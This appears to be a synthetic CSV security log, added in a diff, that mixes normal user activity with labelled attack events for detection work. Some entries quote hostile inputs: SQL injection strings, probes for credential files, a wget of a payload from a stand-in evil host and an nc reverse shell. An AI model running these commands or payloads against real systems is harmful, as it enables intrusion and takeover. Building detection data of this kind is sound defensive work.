@@ -1,0 +1,46 @@
+timestamp,source_ip,username,event_type,status_code,message,severity
+2024-01-15 08:12:01,192.168.1.10,alice,login_success,200,Accepted password for alice from 192.168.1.10,info
+2024-01-15 08:12:45,192.168.1.25,bob,login_success,200,Accepted password for bob from 192.168.1.25,info
+2024-01-15 08:15:12,192.168.1.10,alice,http_request,200,GET /dashboard HTTP/1.1,info
+2024-01-15 08:16:30,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43210 ssh2,high
+2024-01-15 08:16:31,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43211 ssh2,high
+2024-01-15 08:16:32,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43212 ssh2,high
+2024-01-15 08:16:33,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43213 ssh2,high
+2024-01-15 08:16:34,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43214 ssh2,high
+2024-01-15 08:16:35,10.0.0.66,root,auth_failure,401,Failed password for root from 10.0.0.66 port 43215 ssh2,high
+2024-01-15 08:17:00,192.168.1.10,carol,http_request,200,GET /api/users HTTP/1.1,info
+2024-01-15 08:18:15,45.33.32.156,,suspicious_request,403,GET /admin/login HTTP/1.1,critical
+2024-01-15 08:18:20,45.33.32.156,,suspicious_request,403,GET /etc/passwd HTTP/1.1,critical
+2024-01-15 08:18:25,45.33.32.156,,suspicious_request,400,GET /api/users?id=1 UNION SELECT * FROM users-- HTTP/1.1,critical
+2024-01-15 08:19:00,192.168.1.25,bob,http_request,200,POST /api/data HTTP/1.1,info
+2024-01-15 08:20:00,192.168.1.10,alice,http_request,200,GET /dashboard HTTP/1.1,info
+2024-01-15 02:15:33,192.168.100.200,admin,login_success,200,Accepted password for admin from 192.168.100.200 at 02:15 AM,warning
+2024-01-15 02:16:00,192.168.100.200,admin,privilege_escalation,200,sudo: admin ran /bin/bash as root at unusual hour,critical
+2024-01-15 08:22:00,203.0.113.99,,port_scan,0,SCAN attempt from 203.0.113.99 to port 22 refused,high
+2024-01-15 08:22:01,203.0.113.99,,port_scan,0,SCAN attempt from 203.0.113.99 to port 80 refused,high
+2024-01-15 08:22:02,203.0.113.99,,port_scan,0,SCAN attempt from 203.0.113.99 to port 443 refused,high
+2024-01-15 08:22:03,203.0.113.99,,port_scan,0,SCAN attempt from 203.0.113.99 to port 3306 refused,high
+2024-01-15 08:22:04,203.0.113.99,,port_scan,0,SCAN attempt from 203.0.113.99 to port 5432 refused,high
+2024-01-15 08:25:00,192.168.1.10,alice,http_request,200,GET /reports HTTP/1.1,info
+2024-01-15 08:26:00,10.0.1.5,frank,login_success,200,Accepted password for frank from 10.0.1.5,info
+2024-01-15 08:27:00,185.220.101.34,,malware_behavior,0,Suspicious process: wget http://evil.example.com/payload.sh executed,critical
+2024-01-15 08:28:00,185.220.101.34,,malware_behavior,0,Suspicious process: nc -e /bin/bash 185.220.101.34 4444 executed,critical
+2024-01-15 08:30:00,192.168.1.25,bob,http_request,200,GET /api/logs HTTP/1.1,info
+2024-01-15 08:31:00,192.168.1.10,alice,logout,200,Disconnected from 192.168.1.10,info
+2024-01-15 08:32:00,10.0.1.5,frank,http_request,404,GET /wp-admin/admin.php HTTP/1.1,warning
+2024-01-15 08:33:00,91.108.4.100,,suspicious_request,500,POST /.env HTTP/1.1 - Environment file access attempt,critical
+2024-01-15 08:34:00,192.168.1.25,bob,login_success,200,Accepted password for bob from 192.168.1.25,info
+2024-01-15 08:35:00,10.0.0.66,admin,auth_failure,401,Failed password for admin from 10.0.0.66 port 44100 ssh2,high
+2024-01-15 08:35:01,10.0.0.66,admin,auth_failure,401,Failed password for admin from 10.0.0.66 port 44101 ssh2,high
+2024-01-15 08:35:02,10.0.0.66,admin,auth_failure,401,Failed password for admin from 10.0.0.66 port 44102 ssh2,high
+2024-01-15 08:36:00,192.168.1.10,carol,http_request,201,POST /api/upload HTTP/1.1,info
+2024-01-15 08:37:00,192.168.1.10,carol,http_request,200,GET /dashboard HTTP/1.1,info
+2024-01-15 08:38:00,198.51.100.42,,unauthorized_access,403,Permission denied: access to /etc/shadow from 198.51.100.42,high
+2024-01-15 08:39:00,192.168.1.25,dave,login_success,200,Accepted password for dave from 192.168.1.25,info
+2024-01-15 08:40:00,192.168.1.25,dave,http_request,200,GET /settings HTTP/1.1,info
+2024-01-15 08:41:00,176.10.104.240,,suspicious_request,403,GET /phpmyadmin/index.php HTTP/1.1,critical
+2024-01-15 08:42:00,176.10.104.240,,suspicious_request,400,POST /login?user=admin'--&pass=x HTTP/1.1,critical
+2024-01-15 08:43:00,192.168.1.10,alice,login_success,200,Accepted password for alice from 192.168.1.10,info
+2024-01-15 08:44:00,192.168.1.10,alice,http_request,200,GET /ml-analytics HTTP/1.1,info
+2024-01-15 08:45:00,10.0.1.15,grace,login_success,200,Accepted password for grace from 10.0.1.15,info
+2024-01-15 08:46:00,10.0.1.15,grace,http_request,200,GET /alerts HTTP/1.1,info
